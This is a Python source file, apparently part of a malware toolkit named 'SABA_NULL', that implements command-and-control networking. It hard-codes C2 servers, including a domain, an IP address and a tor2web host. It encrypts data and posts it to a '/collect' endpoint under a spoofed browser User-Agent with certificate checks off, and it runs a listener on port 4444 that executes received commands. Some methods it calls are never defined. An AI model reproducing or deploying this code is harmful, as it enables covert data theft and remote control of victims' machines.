#!/usr/bin/env python3
# C2 Network Communication

import socket
import ssl
import threading
import json
import base64
from Crypto.Cipher import AES
import hashlib

class C2Network:
    def __init__(self):
        self.servers = [
            {"host": "primary.c2.sabanull.xyz", "port": 443, "active": True},
            {"host": "185.220.101.204", "port": 8443, "active": True},
            {"host": "backup.tor2web.io", "port": 443, "active": True}
        ]
        self.current_server = 0
        self.encryption_key = None
        
    def generate_encryption_key(self):
        """توليد مفتاح تشفير ديناميكي"""
        import time
        seed = str(time.time()) + "SABA_NULL_SECRET_2024"
        self.encryption_key = hashlib.sha256(seed.encode()).digest()
        return self.encryption_key
        
    def encrypt_packet(self, data):
        """تشفير حزمة البيانات"""
        if isinstance(data, dict):
            data = json.dumps(data)
        if isinstance(data, str):
            data = data.encode()
            
        cipher = AES.new(self.encryption_key, AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(data)
        
        return {
            'nonce': base64.b64encode(cipher.nonce).decode(),
            'tag': base64.b64encode(tag).decode(),
            'data': base64.b64encode(ciphertext).decode()
        }
        
    def send_to_c2(self, packet):
        """إرسال بيانات إلى سيرفر C2"""
        import requests
        
        encrypted = self.encrypt_packet(packet)
        
        for server in self.servers:
            if server['active']:
                try:
                    url = f"https://{server['host']}:{server['port']}/collect"
                    response = requests.post(
                        url,
                        json=encrypted,
                        headers={
                            'User-Agent': 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36',
                            'Content-Type': 'application/json'
                        },
                        timeout=10,
                        verify=False
                    )
                    return response.status_code == 200
                except:
                    server['active'] = False
                    continue
        return False
        
    def start_c2_listener(self, port=4444):
        """بدء خادم C2 للتحكم عن بعد"""
        def listener():
            context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            context.load_cert_chain('cert.pem', 'key.pem')
            
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.bind(('0.0.0.0', port))
                sock.listen(5)
                
                with context.wrap_socket(sock, server_side=True) as ssock:
                    print(f"[+] C2 Listener active on port {port}")
                    while True:
                        conn, addr = ssock.accept()
                        client_thread = threading.Thread(
                            target=self.handle_client,
                            args=(conn, addr)
                        )
                        client_thread.start()
                        
        thread = threading.Thread(target=listener, daemon=True)
        thread.start()
        
    def handle_client(self, conn, addr):
        """معالجة اتصال العميل"""
        try:
            data = conn.recv(4096)
            if data:
                # فك تشفير البيانات
                decrypted = self.decrypt_packet(data)
                
                # تنفيذ الأوامر
                if decrypted.get('command'):
                    result = self.execute_command(decrypted['command'])
                    conn.send(self.encrypt_packet(result))
                    
        except Exception as e:
            print(f"[-] Client error: {e}")
        finally:
            conn.close()
